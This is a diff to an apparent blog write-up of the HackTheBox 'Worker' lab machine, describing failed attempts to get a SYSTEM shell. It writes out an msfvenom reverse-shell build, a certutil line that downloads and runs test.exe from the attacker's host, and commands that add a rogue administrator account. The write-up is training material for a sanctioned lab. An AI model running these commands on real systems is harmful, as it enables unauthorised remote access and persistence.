@@ -1,7 +1,7 @@
 ---
 layout: post
 title:  "HTB Worker writeup"
-date:   2021-01-09 18:00:00 +0300
+date:   2021-02-07 18:00:00 +0300
 categories: HTB_writeup
 summary: Writeup for HackTheBox.eu's Worker machine. Notes on obtaining the user and root flags and also some failures in trying to get a root shell. 
 ---
@@ -201,6 +201,86 @@ In this case we are lucky: this runs as SYSTEM and so this should be our last st
 
 ### Many failed attempts to obtain a shell
 
+After the initial success in getting some code to be executed as SYSTEM, I tried to obtain a reverse shell using the same method.  
+First, I generated a reverse shell by using msfvenom and hosted it on a web server.
+
+{%highlight bash%}
+msfvenom -p windows/shell/reverse_tcp lhost=10.10.14.113 lport=1234 -f exe > test.exe
+python3 -m http.server 8888
+{%endhighlight%}
+
+![Preparing the reverse shell]({{site.baseurl}}/assets/img/HTB/worker/reverse_shell_exe.png){: .center-image}
+
+Then, I added a new pipeline that would download the reverse shell executable from my server and then run it.  
+For the download, I used certutil instead of cURL this time.
+{%highlight powershell%}
+certutil.exe -urlcache -split -f http://10.10.14.113/test.exe & test.exe
+{%endhighlight%}
+
+![Reverse shell pipeline]({{site.baseurl}}/assets/img/HTB/worker/preparing_root_shell.png){: .center-image}
+
+I opened a listener and ran the pipeline.  
+The execution was successful (after some errors that were quite easy to fix).  
+However, the connection closed quickly without me being able to run any commands.  
+
+![Failure - the shell does not connect]({{site.baseurl}}/assets/img/HTB/worker/fail_shell.png){: .center-image}
+
+I tried using a more common port like 80 or 443 to avoid firewalls without any success.  
+I also tried a bind shell but that didn't work either.
+
 ### More failed attempt to add a new user (and use it)
 
+Another common approach in this situation is to create a new user and grant it administrative privileges.  
+In this case, the user will also need to be in the correct group to be able to use WinRM.
+
+So first, I created the user by running (this should be on a single line but I separated them for visibility)
+
+{%highlight powershell%}
+net user testuser001 5f4dcc3b5aa765d61d8327deb882cf99 /add & 
+net localgroup Administrators testuser001 /add
+{%endhighlight%}
+
+![Trying to add a new user]({{site.baseurl}}/assets/img/HTB/worker/add_user.png){: .center-image}
+
+The hash used there is the MD5 for 'password'. I was not very creative at that moment.  
+However, I found out that it was too long for Windows so it was rejected.
+
+![Error - password was too long]({{site.baseurl}}/assets/img/HTB/worker/error_long_pwd.png){: .center-image}
+
+I changed that to 'P@ssw0rd' and tried again
+
+{%highlight bash%}
+net user testuser001 P@ssw0rd /add & net localgroup Administrators testuser001 /add
+{%endhighlight%}
+
+![Output for adding a new user]({{site.baseurl}}/assets/img/HTB/worker/user_add.png){: .center-image}
+
+This time, the user was successfully added.  
+However, I could not login using WinRM.  
+At first, I noticed that I forgot to add it to the 'Remote Management Users' group. I did that by creating another pipeline and running
+
+{%highlight powershell%}
+net localgroup "Remote Management Users" testuser001 /add
+{%endhighlight%}
+
+I used the account that I already had (robisl) to check that the user is created and that it belongs to the correct groups.  
+I tried adding it to all the groups that robisl was in but in the end I could not get this to work. The user was there but I could not use WinRM to authenticate using it.
+
 ### Giving up and getting the root flag
+
+After one or two hours of trying to obtain access using the method described above I gave up and just dumped the flag by running
+
+{%highlight powershell%}
+type C:\Users\Administrator\Desktop\root.txt
+{%endhighlight%}
+
+It's not as good, but it works.
+
+![Root flag]({{site.baseurl}}/assets/img/HTB/worker/root_flag.png){: .center-image}
+
+### After reading approaches used by others ...
+
+After this machine got retired I read some of the writeups published by others.  
+For now, a common approach that I've seen is adding robisl to the Administrators group.  
+I guess that works but I was on the public server when I did this and I wanted to avoid changing the way this machine works for other users.  
+Also, it looks like even that method was not granting access everytime (ex: the user appeared to be in the Administrators group but it could not access the flag).  
